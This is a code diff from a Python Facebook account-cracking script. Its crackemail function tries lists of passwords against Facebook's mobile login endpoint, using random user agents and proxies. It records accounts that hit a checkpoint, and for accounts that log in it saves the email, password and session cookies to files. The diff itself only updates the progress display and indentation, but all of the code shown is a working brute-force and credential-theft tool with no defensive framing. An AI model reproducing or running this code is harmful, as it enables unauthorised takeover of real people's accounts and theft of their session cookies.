@@ -1664,8 +1664,8 @@ def metcepat():
 def crackemail(idf,pwv,nmf):
 	global loop,ok,cp
 	miw, asu = random.choice(["/","|","-"]), random.choice([M,K,H,U,B])
-	sys.stdout.write(f"\r{P}[{B}COBA{P}] [{M}{loop}{P}/{U}{len(id)}{P}] {P}[{H}{ok}{P}] [{M}{cp}{P}] {'{:.0%}'.format(loop/float(len(id)))}{P} "),
-	sys.stdout.flush()
+	prog.update(des,description=f" {K2}•{H2} CRACKEMAIL {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des)
 	ua = random.choice(ugent)
 	ses = requests.Session()
 	for pw in pwv:
@@ -1699,18 +1699,16 @@ def crackemail(idf,pwv,nmf):
 			}
 			po = ses.post('https://m.latest.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-			  print(f"\r{P}[{M}CP{P}] {K}{idf}|{pw}")
-				
-			  open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-			  akun.append(idf+'|'+pw)
-			  cp+=1
-			  break
+				print(f"\r{P}[{M}CP{P}] {K}{idf}|{pw}")
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f"\r{P}[{B}OK{P}] {H}{idf}|{pw}\n")
-
 				print(f"\r{K}{kuki}|{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 				break
